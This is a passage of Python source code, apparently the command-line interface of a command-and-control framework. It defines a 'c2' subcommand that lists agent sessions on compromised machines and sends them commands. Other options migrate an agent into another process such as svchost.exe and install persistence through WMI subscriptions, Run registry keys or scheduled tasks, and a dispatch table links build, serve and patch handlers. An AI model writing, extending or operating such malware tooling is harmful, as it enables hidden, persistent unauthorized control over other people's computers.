    c2_p = sub.add_parser("c2", help="Interact with active C2 agent sessions")
    c2_p.add_argument("--list",    action="store_true",  help="List active sessions")
    c2_p.add_argument("--session", metavar="ID",         help="Session ID to interact with")
    c2_p.add_argument("--cmd",     metavar="CMD",        help="One-shot command (prints result and exits)")
    c2_p.add_argument("--timeout", metavar="SEC", type=int,
                      help="Result wait timeout in seconds (default: c2_timeout_s from config, or 50)")
    c2_p.add_argument("--migrate", metavar="PROC", nargs="?", const="",
                      help="Migrate agent to another process (optional: target process name, e.g. svchost.exe)")
    c2_p.add_argument("--persist", metavar="TYPE", choices=["wmi", "run", "schtask"],
                      help="Install persistence: wmi (admin/SYSTEM, WMI subscription) | "
                           "run (user, HKCU Run key) | schtask (user, scheduled task at logon)")
    c2_p.add_argument("--kill",    metavar="SID",
                      help="Remove a session from the registry (use after migration to clean up old session)")

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(0)

    cfg = load_config()
    ws  = Workspace()

    dispatch = {
        "init":  cmd_init,
        "build": cmd_build,
        "serve": cmd_serve,
        "list":  cmd_list,
        "check": cmd_check,
        "c2":    cmd_c2,
        "patch": cmd_patch,
    }
    dispatch[args.command](args, cfg, ws)


if __name__ == "__main__":
    main()
